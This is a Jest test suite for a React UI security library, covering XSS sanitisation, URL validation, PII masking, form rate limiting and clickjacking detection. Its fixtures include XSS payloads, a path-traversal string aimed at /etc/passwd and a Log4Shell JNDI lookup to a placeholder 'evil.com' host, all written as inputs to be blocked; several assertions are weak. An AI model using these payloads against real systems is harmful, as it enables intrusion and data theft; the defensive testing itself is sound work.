/**
 * SECURITY CRITICAL: UI Security Testing Framework
 * 
 * Comprehensive tests for UI security components:
 * - XSS protection testing
 * - Input sanitization validation
 * - Component security wrapper testing
 * - Form security validation
 * - File upload security
 * - Authentication component security
 */

import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import { SecureWrapper } from '../components/security/SecureWrapper'
import { SecureForm } from '../components/security/SecureForm'
import { xssProtector } from '../lib/xss-protection'
import { clientSanitizer } from '../lib/client-data-sanitizer'

describe('UI Security Test Suite', () => {
  
  describe('XSS Protection', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(1)">',
      '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      '<svg onload="alert(1)">',
      '<math><style><img src=x onerror=alert(1)></style></math>',
      '<div onclick="alert(1)">Click me</div>',
      'data:text/html,<script>alert(1)</script>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">'
    ]

    test('should sanitize XSS payloads in HTML content', () => {
      xssPayloads.forEach(payload => {
        const result = xssProtector.sanitizeHTML(payload)
        
        expect(result.sanitized).not.toContain('<script')
        expect(result.sanitized).not.toContain('javascript:')
        expect(result.sanitized).not.toContain('onerror=')
        expect(result.violations).toHaveLength(expect.any(Number))
        
        if (result.violations.length > 0) {
          expect(result.violations[0].severity).toBeOneOf(['HIGH', 'CRITICAL'])
        }
      })
    })

    test('should block dangerous URLs', () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'livescript:alert(1)'
      ]

      dangerousUrls.forEach(url => {
        const result = xssProtector.validateURL(url)
        expect(result.isSafe).toBe(false)
        expect(result.violations).toHaveLength(expect.any(Number))
      })
    })

    test('should allow safe URLs', () => {
      const safeUrls = [
        'https://example.com',
        'http://localhost:3000',
        'mailto:test@example.com',
        'tel:+1234567890',
        '/relative/path',
        '#anchor'
      ]

      safeUrls.forEach(url => {
        const result = xssProtector.validateURL(url)
        expect(result.isSafe).toBe(true)
        expect(result.violations).toHaveLength(0)
      })
    })
  })

  describe('Data Sanitization', () => {
    test('should detect and mask PII data', () => {
      const testData = {
        email: 'user@example.com',
        phone: '(555) 123-4567',
        creditCard: '4532015112830366',
        ssn: '123-45-6789'
      }

      const result = clientSanitizer.sanitize(testData, {
        enablePIIDetection: true
      })

      expect(result.piiDetected).toHaveLength(expect.any(Number))
      expect(result.piiDetected.some(pii => pii.type === 'email')).toBe(true)
      expect(result.piiDetected.some(pii => pii.type === 'credit_card')).toBe(true)
    })

    test('should sanitize dangerous input patterns', () => {
      const dangerousInputs = [
        '<script>malicious()</script>',
        'javascript:void(0)',
        'SELECT * FROM users',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ]

      dangerousInputs.forEach(input => {
        const result = clientSanitizer.sanitize(input, {
          enableXSSProtection: true,
          strictMode: true
        })

        expect(result.violations).toHaveLength(expect.any(Number))
        expect(result.sanitized).not.toEqual(input)
      })
    })

    test('should validate file uploads securely', async () => {
      // Mock file with suspicious content
      const maliciousFile = new File(
        ['<script>alert("xss")</script>'],
        'malicious.html',
        { type: 'text/html' }
      )

      // This would be tested with the SecureFileUpload component
      expect(maliciousFile.type).toBe('text/html')
      expect(maliciousFile.name.includes('script')).toBe(false) // Filename should be safe
    })
  })

  describe('Form Security', () => {
    test('should validate form inputs and prevent submission with violations', async () => {
      const mockOnSubmit = jest.fn()
      const mockOnViolation = jest.fn()

      const formFields = [
        {
          name: 'username',
          type: 'text' as const,
          required: true,
          maxLength: 50
        },
        {
          name: 'email',
          type: 'email' as const,
          required: true
        }
      ]

      render(
        <SecureForm
          fields={formFields}
          onSubmit={mockOnSubmit}
          onSecurityViolation={mockOnViolation}
          config={{
            requiredSecurityLevel: 'high',
            enableRealTimeValidation: true
          }}
        />
      )

      // Try to input XSS payload
      const usernameInput = screen.getByDisplayValue(/username/i)
      fireEvent.change(usernameInput, { 
        target: { value: '<script>alert("xss")</script>' } 
      })

      await waitFor(() => {
        expect(mockOnViolation).toHaveBeenCalled()
      })
    })

    test('should rate limit form submissions', async () => {
      const mockOnSubmit = jest.fn()
      
      render(
        <SecureForm
          fields={[{ name: 'test', type: 'text' }]}
          onSubmit={mockOnSubmit}
          config={{
            enableRateLimiting: true,
            maxSubmissionsPerMinute: 2
          }}
        />
      )

      const submitButton = screen.getByText(/submit/i)

      // Submit multiple times rapidly
      for (let i = 0; i < 5; i++) {
        fireEvent.click(submitButton)
        await new Promise(resolve => setTimeout(resolve, 100))
      }

      // Should be rate limited after 2 submissions
      expect(mockOnSubmit).toHaveBeenCalledTimes(2)
    })
  })

  describe('Component Security Wrapper', () => {
    test('should block rendering for critical security violations', () => {
      const dangerousContent = '<script>alert("pwned")</script>'
      
      render(
        <SecureWrapper
          config={{
            enableXSSProtection: true,
            sanitizationLevel: 'strict'
          }}
          allowUnsafeContent={false}
        >
          <div dangerouslySetInnerHTML={{ __html: dangerousContent }} />
        </SecureWrapper>
      )

      // Should show security blocked message instead of dangerous content
      expect(screen.getByText(/content blocked/i)).toBeInTheDocument()
      expect(screen.queryByText(/pwned/)).not.toBeInTheDocument()
    })

    test('should detect clickjacking attempts', () => {
      // Mock iframe detection
      Object.defineProperty(window, 'self', { value: {} })
      Object.defineProperty(window, 'top', { value: {} })

      const mockViolation = jest.fn()

      render(
        <SecureWrapper
          sensitiveContent={true}
          onSecurityViolation={mockViolation}
          config={{ enableClickjackingProtection: true }}
        >
          <button>Sensitive Action</button>
        </SecureWrapper>
      )

      // Should detect iframe and report violation
      expect(mockViolation).toHaveBeenCalledWith(
        expect.objectContaining({
          type: 'CLICKJACKING'
        })
      )
    })
  })

  describe('Authentication Security', () => {
    test('should validate password strength', () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'abc123',
        'admin'
      ]

      const strongPasswords = [
        'MyStr0ng!P@ssw0rd',
        'Correct-Horse-Battery-Staple-42!',
        'aB3$fG7*kL9#mN2@'
      ]

      // Test weak passwords
      weakPasswords.forEach(password => {
        // This would test the SecurePasswordInput component
        expect(password.length < 12 || !/[A-Z]/.test(password) || !/[!@#$%^&*]/.test(password)).toBe(true)
      })

      // Test strong passwords  
      strongPasswords.forEach(password => {
        expect(password.length >= 12).toBe(true)
        expect(/[A-Z]/.test(password)).toBe(true)
        expect(/[a-z]/.test(password)).toBe(true)
        expect(/[0-9]/.test(password)).toBe(true)
        expect(/[!@#$%^&*]/.test(password)).toBe(true)
      })
    })

    test('should implement account lockout after failed attempts', async () => {
      // This would test the SecurePINInput component
      const maxAttempts = 3
      let attempts = 0

      const simulateFailedAttempt = () => {
        attempts++
        return attempts >= maxAttempts
      }

      // Simulate failed attempts
      expect(simulateFailedAttempt()).toBe(false) // 1st attempt
      expect(simulateFailedAttempt()).toBe(false) // 2nd attempt  
      expect(simulateFailedAttempt()).toBe(true)  // 3rd attempt - should lock
    })
  })

  describe('Performance Security', () => {
    test('should not leak sensitive data in memory', () => {
      const sensitiveData = {
        password: 'secret123',
        token: 'abc123def456',
        key: 'sensitive-key'
      }

      // Simulate secure state management
      const secureState = new Map()
      
      // Store data
      secureState.set('sensitive', { ...sensitiveData })
      
      // Clear original object
      Object.keys(sensitiveData).forEach(key => {
        delete sensitiveData[key as keyof typeof sensitiveData]
      })

      // Original should be cleared
      expect(Object.keys(sensitiveData)).toHaveLength(0)
      
      // But secure state should still have it
      expect(secureState.get('sensitive')).toBeDefined()
    })

    test('should have acceptable performance for security operations', async () => {
      const largeContent = 'x'.repeat(10000) + '<script>alert("xss")</script>' + 'y'.repeat(10000)
      
      const startTime = performance.now()
      const result = xssProtector.sanitizeHTML(largeContent)
      const endTime = performance.now()
      
      // Should complete within reasonable time (< 100ms for 20KB content)
      expect(endTime - startTime).toBeLessThan(100)
      expect(result.sanitized).toBeDefined()
    })
  })

  describe('Integration Security', () => {
    test('should work together: wrapper + form + validation', async () => {
      const mockOnSubmit = jest.fn()
      
      render(
        <SecureWrapper
          config={{ enableXSSProtection: true }}
          sensitiveContent={true}
        >
          <SecureForm
            fields={[
              { name: 'comment', type: 'textarea', required: true }
            ]}
            onSubmit={mockOnSubmit}
            config={{
              sanitizeInputs: true,
              requiredSecurityLevel: 'high'
            }}
          />
        </SecureWrapper>
      )

      const textarea = screen.getByRole('textbox')
      const submitButton = screen.getByText(/submit/i)

      // Try malicious input
      fireEvent.change(textarea, {
        target: { value: '<img src=x onerror=alert(1)>' }
      })

      fireEvent.click(submitButton)

      await waitFor(() => {
        // Should either sanitize the input or block submission
        if (mockOnSubmit.mock.calls.length > 0) {
          const submittedData = mockOnSubmit.mock.calls[0][0]
          expect(submittedData.comment).not.toContain('<img')
          expect(submittedData.comment).not.toContain('onerror')
        }
      })
    })
  })
})

// Helper function for test assertions
expect.extend({
  toBeOneOf(received, array) {
    const pass = array.includes(received)
    return {
      pass,
      message: () => `expected ${received} to be one of ${array.join(', ')}`
    }
  }
})